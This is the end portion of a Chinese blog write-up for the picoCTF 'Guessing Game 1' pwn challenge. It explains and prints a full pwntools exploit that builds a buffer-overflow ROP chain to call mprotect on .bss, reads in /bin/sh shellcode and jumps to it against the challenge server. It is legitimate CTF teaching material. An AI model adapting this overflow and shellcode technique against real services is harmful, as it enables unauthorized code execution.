+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">payload1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'a'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">120</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rdi_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(bss_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rsi_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(buf_size)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rdx_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(buf_prot)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(mprotect_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(main_addr)</span></span></code></pre>
+<p>接着在下一轮中用 <code>read</code> 读入shellcode</p>
+<pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">payload2</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'a'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">120</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rdi_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rsi_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(shellcode_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rdx_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">29</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(read_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(main_addr)</span></span></code></pre>
+<p>最后再执行shellcode</p>
+<pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">payload3</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'a'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">120</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(shellcode_addr)</span></span></code></pre>
+<h3 id="0x05-exp"><a class="heading-anchor" href="#0x05-exp">0x05 exp</a></h3>
+<pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">from</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> pwn </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">import</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583"> *</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">ip</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"124.16.75.117"</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">port</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">51001</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">conn</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">connect(ip,port)</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">#conn=process("./pwn/q36_guessing_game_1/vuln")</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">context.log_level</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"debug"</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">bss_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">00000000006BC000</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">mprotect_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">000000000044B480</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">buf_size</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">1000</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">buf_prot</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">7</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">rdi_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">0000000000400696</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">rsi_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">0000000000410ca3</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">rdx_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">000000000044cc26</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">return_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">0000000000400CEE</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">main_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">0000000000400C8C</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">write_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">000000000044A770</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">read_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">000000000044A6A0</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">shellcode_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">00000000006BC554</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">shellcode</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(conn.recvuntil(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"What number would you like to guess?</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">))</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">conn.sendline(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'84'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(conn.recvuntil(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'!</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">Name?'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">))</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">payload1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'a'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">120</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rdi_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(bss_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rsi_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(buf_size)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rdx_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(buf_prot)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(mprotect_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(main_addr)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">conn.sendline(payload1)</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(conn.recvuntil(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"What number would you like to guess?</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">))</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">conn.sendline(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'87'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(conn.recvuntil(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'!</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">Name?'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">))</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">payload2</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'a'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">120</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rdi_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rsi_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(shellcode_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(rdx_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">29</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(read_addr)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(main_addr)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">conn.sendline(payload2)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">conn.send(shellcode)</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(conn.recvuntil(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"What number would you like to guess?</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">))</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">conn.sendline(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'78'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(conn.recvuntil(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'!</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">Name?'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">))</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">payload3</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">b</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'a'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">120</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">p64(shellcode_addr)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">conn.sendline(payload3)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">conn.interactive()</span></span>
+<span class="line"></span></code></pre>
+<h3 id="0x06-其他的做法"><a class="heading-anchor" href="#0x06-其他的做法">0x06 其他的做法</a></h3>
+<p><a href="https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-1/">Guessing Game 1 | 7Rocky</a></p></div>
+    <footer class="ap-article__foot">
+      <div class="ap-article__tags"><span class="ap-label">标签</span><ul class="ap-tags"><li><a class="ap-tag" href="/tags/ctf/">ctf</a></li><li><a class="ap-tag" href="/tags/writeup/">writeup</a></li><li><a class="ap-tag" href="/tags/pwn/">pwn</a></li></ul></div>
+      <nav class="ap-route" aria-label="航线">
+        <a class="ap-route__btn ap-route__btn--prev" href="/posts/how-to-use-tikz-in-your-blog/" rel="prev"><span class="ap-label">上一篇</span><span class="ap-route__title">解决vscode无法对markdown源码中新定义语言(tikz)高亮的问题</span></a>
+        <a class="ap-route__btn ap-route__btn--next" href="/posts/discrete-mathematics-graph-theory/" rel="next"><span class="ap-label">下一篇 <svg viewBox="0 0 16 16" width="14" height="14"><path d="M2 8h11M9 4l4 4-4 4" fill="none" stroke="currentColor" stroke-width="1.5"/></svg></span><span class="ap-route__title">离散数学——图论总结归纳</span></a>
+      </nav>
+    </footer>
+  </article>
+          </main>
+          <aside class="ap-panel" aria-label="遥测"><section class="ap-module ap-module--gauge" aria-hidden="true">
+    <div class="ap-gauge">
+      <div class="ap-gauge__head">
+        <span class="ap-label">ALT</span>
+        <span class="ap-gauge__value"><span data-progress-text>000</span><small>%</small></span>
+        <span class="ap-gauge__sec" data-gauge-sec></span>
+      </div>
+      <div class="ap-gauge__track" data-progress-v>
+        <span class="ap-gauge__fill"></span>
+        <span class="ap-gauge__mark"></span>
+      </div>
+      <div class="ap-gauge__scale"><span style="--at:0%">0</span><span style="--at:25%">25</span><span style="--at:50%">50</span><span style="--at:75%">75</span><span style="--at:100%">100</span></div>
+    </div>
+  </section><section class="ap-module">
+    <h2 class="ap-module__head"><span>程序清单</span><span class="ap-module__count">07</span></h2>
+    <ol class="ap-check"><li class="ap-check__item" data-level="0">
+      <a href="#guessing-game-1" data-toc="guessing-game-1">
+        <span class="ap-check__box" aria-hidden="true"></span>
+        <span class="ap-check__no">01</span>
+        <span class="ap-check__text">Guessing Game 1</span>
+      </a>
+    </li><li class="ap-check__item" data-level="1">
+      <a href="#0x01-常规看看" data-toc="0x01-常规看看">
+        <span class="ap-check__box" aria-hidden="true"></span>
+        <span class="ap-check__no">01.1</span>
+        <span class="ap-check__text">0x01 常规看看</span>
+      </a>
+    </li><li class="ap-check__item" data-level="1">
+      <a href="#0x02-初步分析" data-toc="0x02-初步分析">
+        <span class="ap-check__box" aria-hidden="true"></span>
+        <span class="ap-check__no">01.2</span>
+        <span class="ap-check__text">0x02 初步分析</span>
+      </a>
+    </li><li class="ap-check__item" data-level="1">
+      <a href="#0x03-mprotect" data-toc="0x03-mprotect">
+        <span class="ap-check__box" aria-hidden="true"></span>
+        <span class="ap-check__no">01.3</span>
+        <span class="ap-check__text">0x03 mprotect()</span>
+      </a>
+    </li><li class="ap-check__item" data-level="1">
+      <a href="#0x04-pwn-it" data-toc="0x04-pwn-it">
+        <span class="ap-check__box" aria-hidden="true"></span>
+        <span class="ap-check__no">01.4</span>
+        <span class="ap-check__text">0x04 Pwn it！</span>
+      </a>
+    </li><li class="ap-check__item" data-level="1">
+      <a href="#0x05-exp" data-toc="0x05-exp">
+        <span class="ap-check__box" aria-hidden="true"></span>
+        <span class="ap-check__no">01.5</span>
+        <span class="ap-check__text">0x05 exp</span>
+      </a>
+    </li><li class="ap-check__item" data-level="1">
+      <a href="#0x06-其他的做法" data-toc="0x06-其他的做法">
+        <span class="ap-check__box" aria-hidden="true"></span>
+        <span class="ap-check__no">01.6</span>
+        <span class="ap-check__text">0x06 其他的做法</span>
+      </a>
+    </li></ol>
+  </section><section class="ap-module">
+    <h2 class="ap-module__head"><span>本文标签</span><span class="ap-module__count">03</span></h2>
+    <ul class="ap-tags"><li><a class="ap-tag" href="/tags/ctf/">ctf</a></li><li><a class="ap-tag" href="/tags/writeup/">writeup</a></li><li><a class="ap-tag" href="/tags/pwn/">pwn</a></li></ul>
+  </section></aside>
+        </div>
+        <footer class="ap-foot">
+    <div class="ap-stripe ap-stripe--thin" aria-hidden="true"></div>
+    <div class="ap-foot__plate">
+      <dl class="ap-foot__grid">
+        <div><dt>OPR</dt><dd>dx3906</dd></div>
+        <div><dt>YR</dt><dd>2026</dd></div>
+        <div><dt>CODE</dt><dd>MIT</dd></div>
+        <div><dt>TEXT</dt><dd>CC BY-NC-SA 4.0</dd></div>
+      </dl>
+      <p class="ap-foot__note">
+        <span>© 2026 dx3906</span>
+        <span class="ap-sep" aria-hidden="true">·</span>
+        <span>由 dxbe 生成</span>
+        <span class="ap-sep" aria-hidden="true">·</span><a href="https://github.com/dx3906999/dx3906999.github.io" rel="noopener">查看源码</a>
+      </p>
+      <p class="ap-foot__serial" aria-hidden="true">SN-2026-ZH-0001 <span>NO STEP</span></p>
+    </div>
+  </footer>
+      </div>
+    </div>
+    <script type="module" src="/assets/apogee/js/site.js?v=cd7c505ced"></script>
+    
+  </body>
+</html>
